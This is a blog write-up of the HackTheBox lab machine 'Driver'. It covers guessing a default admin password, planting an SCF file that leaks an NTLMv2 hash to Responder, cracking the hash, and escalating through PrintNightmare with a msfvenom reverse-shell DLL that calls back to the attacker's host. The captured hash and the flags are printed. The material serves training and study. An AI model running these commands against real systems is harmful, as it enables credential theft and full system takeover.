
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark)"
    href="../../theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark)"
          href="../../theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
          href="../../theme/pygments/sas.min.css">


  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">


    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">



  


 

<meta name="author" content="maggick" />
<meta name="description" content="This article is a writeup about a retired HacktheBox machine: Driver published on October 2, 2021 by MrR3boot. This box is rated as easy box the user part implies a &#34;standard&#34; password, a SCF file and Responder The root part is nudged by a few hints (box logo,printer on the foothold website) and implies the use of the CVE-2021-1675 and CVE-2021-34527 also know as PrintNightmare." />
<meta name="keywords" content="security, boot2root, HTB, SCF file attack, print nightmare">


  <meta property="og:site_name" content="maggick's logs"/>
  <meta property="og:title" content="HTB: Driver"/>
  <meta property="og:description" content="This article is a writeup about a retired HacktheBox machine: Driver published on October 2, 2021 by MrR3boot. This box is rated as easy box the user part implies a &#34;standard&#34; password, a SCF file and Responder The root part is nudged by a few hints (box logo,printer on the foothold website) and implies the use of the CVE-2021-1675 and CVE-2021-34527 also know as PrintNightmare."/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="../../2022/02/htb-driver.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2022-02-27 11:40:00+01:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="../../author/maggick.html">
  <meta property="article:section" content="security"/>
  <meta property="article:tag" content="security"/>
  <meta property="article:tag" content="boot2root"/>
  <meta property="article:tag" content="HTB"/>
  <meta property="article:tag" content="SCF file attack"/>
  <meta property="article:tag" content="print nightmare"/>
  <meta property="og:image" content="https://maggick.fr/media/image.png">

  <title>maggick's logs &ndash; HTB: Driver</title>

</head>
<body >
  <aside>
    <div>
      <a href="../../">
        <img src="https://maggick.fr/media/image.png" alt="" title="">
      </a>

      <h1>
        <a href="../../"></a>
      </h1>



      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="../../pages/about.html">
                  About
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/notes.html">
                  Notes
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/tools.html">
                  Tools
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
              <i class="fab fa-github"></i>
            </a>
          </li>
          <li>
            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
          <li>
            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
              <i class="fab fa-stack-overflow"></i>
            </a>
          </li>
          <li>
            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
              <i class="fas fa-rss"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="../../">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="htb-driver">HTB: Driver</h1>
    <p>
      Posted on 27 Feb 2022 in <a href="../../category/security.html">security</a>

        &#8226; 3 min read
    </p>
  </header>


  <div>
    <p><img class="align-left" src="/media/2022.02/driver_card.png" alt="Driver Card" width="262"></p>
<p>This article is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/387">Driver</a> published on
October 2, 2021 by
<a href="https://www.hackthebox.com/home/users/profile/13531">MrR3boot</a>.
This box is rated as easy box the user part implies a "standard" password, a
<a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">SCF file</a>
and <a href="https://github.com/lgandx/Responder">Responder</a>
The root part is nudged by a few hints (box logo,printer on the foothold
website) and implies the use of the CVE-2021-1675 and CVE-2021-34527 also know
as PrintNightmare.</p>


<h1>User</h1>
<h2>Recon</h2>
<p>Let us start as always by a <code>nmap</code> scan. Only port 21 (FTP), 22 (SSH) and 80 with a HTTP
service are open.</p>
<div class="highlight"><pre><span></span><code>PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-10-21T22:20:07
|_  start_date: 2021-10-21T22:16:01
</code></pre></div>

<h2>Web</h2>
<p>The website on port 80 ask for a basic authentication.</p>
<blockquote>
<p>http://10.129.171.196 is requesting your username and password. The site says: “MFP Firmware Update Center. Please enter password for admin”</p>
</blockquote>
<p>We know that the user is admin and we try a few standard passwords: 'password'
'123456' and 'admin'. The latest one is working.</p>
<p>The website is offering to test printer Firmware.</p>
<p><img alt="MFP Firmware Update Center" src="/media/2022.02/driver_01.png"></p>
<h2>SCF file attack</h2>
<p>As mentionned on the Firmware update page:</p>
<blockquote>
<p>Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon.</p>
</blockquote>
<p>As we know the testing team will review the file we can use a
<a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">SCF file attack</a>
to grab the user NTLMv2 hash.</p>
<p>Our SCF file is the following:</p>
<div class="highlight"><pre><span></span><code>[Shell]
Command=2
IconFile=\\10.10.14.55\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
</code></pre></div>

<p>The responder we launched before uploading our "firmware" file grab the <code>tony</code>
user hash:</p>
<div class="highlight"><pre><span></span><code>└─$ sudo responder -I tun0                                                                                                                                                                                                             130 ⨯
&lt;SNIP&gt;
[SMB] NTLMv2-SSP Client   : 10.129.242.208
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:61dd54e51643d459:DFE0DC661F09DAFC004EC1844E9C4721:0101000000000000806B289471C6D7019A27EFE77C3A82220000000002000800350030004900410001001E00570049004E002D004A0053003900390048004F004D005800510052004A0004003400570049004E002D004A0053003900390048004F004D005800510052004A002E0035003000490041002E004C004F00430041004C000300140035003000490041002E004C004F00430041004C000500140035003000490041002E004C004F00430041004C0007000800806B289471C6D7010600040002000000080030003000000000000000000000000020000043273E6F56DF2738F8BCFF72F774D5270EEE087137EC21179464F2626C47E0800A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0035003500000000000000000000000000
</code></pre></div>

<h2>Cracking hash</h2>
<p>We run <code>hashcat</code> on it and grab <code>tony</code>'s password: <code>liltony</code>.</p>
<p>└─$ hashcat hash -m 5600 -a 0 /home/kali/tools/password_lists/rockyou.txt --show
TONY::DRIVER:61dd54e51643d459:dfe0dc661f09dafc004ec1844e9c4721:0101000000000000806b289471c6d7019a27efe77c3a82220000000002000800350030004900410001001e00570049004e002d004a0053003900390048004f004d005800510052004a0004003400570049004e002d004a0053003900390048004f004d005800510052004a002e0035003000490041002e004c004f00430041004c000300140035003000490041002e004c004f00430041004c000500140035003000490041002e004c004f00430041004c0007000800806b289471c6d7010600040002000000080030003000000000000000000000000020000043273e6f56df2738f8bcff72f774d5270eee087137ec21179464f2626c47e0800a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0035003500000000000000000000000000:liltony</p>
<p>Using <a href="https://github.com/Hackplayers/evil-winrm">evil winrm</a> we can connect to
the box using <code>tony</code> credentials and grab the user flag.</p>
<div class="highlight"><pre><span></span><code>└─$ ./evil-winrm.rb -i 10.129.242.208 -u tony -p liltony                                                                                                                                                                                 1 ⨯

Evil-WinRM shell v1.8

Info: Establishing connection to remote endpoint

[0;31;49m*Evil-WinRM*[0m[0;33;49m PS [0mC:\Users\tony\Documents&gt; type ..\Desktop\user.txt
87900be0b26c6031b2cc4d8924950dc4
</code></pre></div>

<h1>Root</h1>
<p>Looking at the running services we see that the Spooler service is running. (Back
in October 2021, Print Nightmare was still the hypest vulnerability. Nobody had
looked at the <code>log4j</code> code yet.)</p>
<div class="highlight"><pre><span></span><code>[0;31;49m*Evil-WinRM*[0m[0;33;49m PS [0mC:\Users\tony\Documents&gt; Get-Service -Name Spooler

Status   Name               DisplayName
------   ----               -----------
Running  Spooler            Print Spooler
</code></pre></div>

<p>A few Google searches lead us to a working <a href="https://github.com/ly4k/PrintNightmare">Print nightmare exploit</a>.</p>
<p>We generate a reverse shell DLL using msfvenom
<code>msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.55 LPORT=4444 -f dll -o /tmp/rev.dll</code></p>
<p>We upload it using <code>evil winrm</code> and grab the root flag.</p>
<div class="highlight"><pre><span></span><code>*Evil-WinRM* PS C:\Users\tony\Documents&gt; upload /tmp/rev.dll
Info: Uploading /tmp/rev.dll to C:\Users\tony\Documents\rev.dll

python3 printnightmare.py tony:liltony@10.129.95.238 -dll &#39;C:\Users\tony\Documents\rev.dll&#39;

C:\Users\Administrator\Desktop&gt;type root.txt
type root.txt
c520e29ba1ecb523a541fc28b75ed0b3
</code></pre></div>

<h1>Wrapping up</h1>
<p>The SCF file attack was great to exploit as this is not something I personally use
a lot. The print nightmare was really interesting as this (was) is one of the
biggest vulnerability of 2021.</p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="../../tag/security.html">security</a>
      <a href="../../tag/boot2root.html">boot2root</a>
      <a href="../../tag/htb.html">HTB</a>
      <a href="../../tag/scf-file-attack.html">SCF file attack</a>
      <a href="../../tag/print-nightmare.html">print nightmare</a>
    </p>
  </div>


  <div class="neighbors">
    <a class="btn float-left" href="../../2022/02/htb-horizontall.html" title="HTB: Horizontall">
      <i class="fa fa-angle-left"></i> Previous Post
    </a>
    <a class="btn float-right" href="../../2022/03/htb-secret.html" title="HTB: Secret">
      Next Post <i class="fa fa-angle-right"></i>
    </a>
  </div>



</article>

    <footer>
<p>
  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="../../theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>

</body>
</html>